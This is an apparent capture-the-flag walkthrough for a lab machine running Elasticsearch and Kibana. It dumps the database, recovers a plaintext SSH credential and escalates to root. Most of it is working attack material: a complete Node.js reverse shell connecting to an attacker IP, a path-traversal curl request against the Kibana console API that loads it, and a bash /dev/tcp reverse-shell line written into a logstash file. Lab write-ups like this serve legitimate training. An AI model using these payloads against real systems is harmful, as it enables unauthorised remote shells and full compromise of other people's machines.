```
https://github.com/taskrabbit/elasticsearch-dump this to dump database.
elasticdump --input http://10.10.10.115:9200 --output myfile.json

Got user: security  (dXNlcjogc2VjdXJpdHkg base64 in database)
Got pass: spanish.is.key

login through ssh: you will get user.txt :)
https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
write this code in my.js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(5560, "10.10.15.71", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


curl http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../tmp/temp.js

do this:- enable listener you will get shell as root.

echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.15.71/1337 0>&1" > /opt/kibana/logstash_1


```
